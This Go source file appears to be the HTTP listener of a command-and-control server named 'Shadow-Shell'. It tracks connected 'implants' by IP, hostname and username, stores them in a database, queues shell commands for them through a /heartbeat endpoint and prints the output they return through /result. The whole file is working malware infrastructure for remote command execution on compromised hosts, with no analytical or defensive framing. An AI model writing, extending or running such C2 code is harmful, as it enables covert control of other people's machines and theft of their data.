package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"sync"
	"time"
)

// Agent struct defines the connected implant's metadata
type Agent struct {
	ID         string    `json:"id"`
	IP         string    `json:"ip"`
	Hostname   string    `json:"hostname"`
	Platform   string    `json:"platform"`
	Username   string    `json:"username"`
	LastSeen   time.Time `json:"-"`
	Status     string    `json:"status"` // "Alive", "Dead", "Busy"
	CommandQ   []string  `json:"-"`      // Queue for pending commands
	LastResult string    `json:"-"`      // Output of the last executed command
}

// Global storage for agents (In-Memory Cache)
var (
	Agents      = make(map[string]*Agent)
	AgentsMutex sync.RWMutex // Mutex for thread-safety
)

// StartHTTPListener initializes the web server
func StartHTTPListener(port string) {
	// 1. Initialize Database
	InitDB()

	// 2. Load existing agents from DB to Memory
	AgentsMutex.Lock()
	Agents = LoadAgents()
	fmt.Printf("[+] Loaded %d agents from Database.\n", len(Agents))
	AgentsMutex.Unlock()

	http.HandleFunc("/heartbeat", handleHeartbeat)
	http.HandleFunc("/result", handleResult)

	fmt.Printf("[+] HTTP Listener started on port %s...\n", port)
	if err := http.ListenAndServe(":"+port, nil); err != nil {
		fmt.Printf("[-] Listener Error: %v\n", err)
	}
}

// handleHeartbeat processes the check-in from the agent
func handleHeartbeat(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}

	var reqAgent Agent
	if err := json.NewDecoder(r.Body).Decode(&reqAgent); err != nil {
		http.Error(w, "Bad Request", http.StatusBadRequest)
		return
	}

	AgentsMutex.Lock()

	// Check if agent exists in RAM
	agent, exists := Agents[reqAgent.ID]
	if !exists {
		// Register new Agent in RAM
		fmt.Printf("\n[!] NEW AGENT CONNECTED: %s (%s)\nShadow-Shell > ", reqAgent.ID, reqAgent.IP)
		reqAgent.LastSeen = time.Now()
		reqAgent.Status = "Alive"
		reqAgent.CommandQ = []string{}

		Agents[reqAgent.ID] = &reqAgent
		agent = &reqAgent
	} else {
		// Update existing Agent in RAM
		agent.LastSeen = time.Now()
		agent.Status = "Alive"
		// Also update dynamic fields if they change
		agent.IP = reqAgent.IP
		agent.Username = reqAgent.Username
		agent.Hostname = reqAgent.Hostname
	}

	// Save/Update to Database (Persistence)
	UpsertAgent(agent)

	AgentsMutex.Unlock()

	// Check for pending tasks
	response := map[string]string{"task": ""}
	AgentsMutex.Lock() // Re-lock for queue operation safety
	if len(agent.CommandQ) > 0 {
		response["task"] = agent.CommandQ[0] // Pop the first command
		agent.CommandQ = agent.CommandQ[1:]  // Shift queue
		agent.Status = "Busy"
	}
	AgentsMutex.Unlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(response)
}

// handleResult processes the command output sent by the agent
func handleResult(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}

	var resultData struct {
		ID     string `json:"id"`
		Output string `json:"output"`
	}

	if err := json.NewDecoder(r.Body).Decode(&resultData); err != nil {
		http.Error(w, "Bad Request", http.StatusBadRequest)
		return
	}

	AgentsMutex.Lock()
	if agent, ok := Agents[resultData.ID]; ok {
		agent.LastResult = resultData.Output
		agent.Status = "Alive"
		// Database update could be here too if we logged command history
		// UpsertAgent(agent)
		fmt.Printf("\n[+] RESULT RECEIVED FROM %s:\n%s\nShadow-Shell > ", agent.ID, agent.LastResult)
	}
	AgentsMutex.Unlock()

	w.WriteHeader(http.StatusOK)
}
